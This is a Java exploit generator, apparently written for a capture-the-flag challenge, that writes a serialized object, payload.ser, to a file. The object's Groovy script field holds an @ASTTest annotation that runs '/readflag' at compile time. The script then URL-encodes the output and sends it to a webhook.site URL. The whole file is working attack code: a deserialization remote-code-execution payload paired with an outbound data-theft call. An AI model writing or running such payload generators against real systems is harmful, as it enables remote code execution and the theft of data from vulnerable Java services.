import java.io.*;
import java.lang.reflect.Field;

public class GeneratePayload {
    public static void main(String[] args) throws Exception {
        // Create a Testing object with malicious Groovy script
        Object testing = Class.forName("com.example.Testing")
            .getConstructor(String.class, int.class)
            .newInstance("test", 100);

        // Use reflection to set the private groovyScript field
        Field groovyScriptField = testing.getClass().getDeclaredField("groovyScript");
        groovyScriptField.setAccessible(true);

        // Groovy script using @ASTTest annotation for RCE during parseClass()
        // @ASTTest executes code during AST transformation (compile time)
        // Exfiltrates flag via HTTP to webhook.site
        String maliciousGroovy =
            "@groovy.transform.ASTTest(value={\n" +
            "  Process p = Runtime.getRuntime().exec(\"/readflag\");\n" +
            "  BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));\n" +
            "  StringBuilder flag = new StringBuilder();\n" +
            "  String line;\n" +
            "  while ((line = br.readLine()) != null) {\n" +
            "    flag.append(line).append('\\\\n');\n" +
            "  }\n" +
            "  p.waitFor();\n" +
            "  String encodedFlag = java.net.URLEncoder.encode(flag.toString(), 'UTF-8');\n" +
            "  String webhookUrl = 'https://webhook.site/2750dfb6-9485-40e3-a4a8-cb3b7f948f8a?flag=' + encodedFlag;\n" +
            "  java.net.URL url = new java.net.URL(webhookUrl);\n" +
            "  java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();\n" +
            "  conn.setRequestMethod('GET');\n" +
            "  conn.getResponseCode();\n" +
            "  conn.disconnect();\n" +
            "})\n" +
            "def x";

        groovyScriptField.set(testing, maliciousGroovy);

        // Serialize the object
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(testing);
        oos.close();

        // Write to file
        FileOutputStream fos = new FileOutputStream("payload.ser");
        fos.write(baos.toByteArray());
        fos.close();

        System.out.println("Payload generated: payload.ser");
        System.out.println("Size: " + baos.toByteArray().length + " bytes");
    }
}
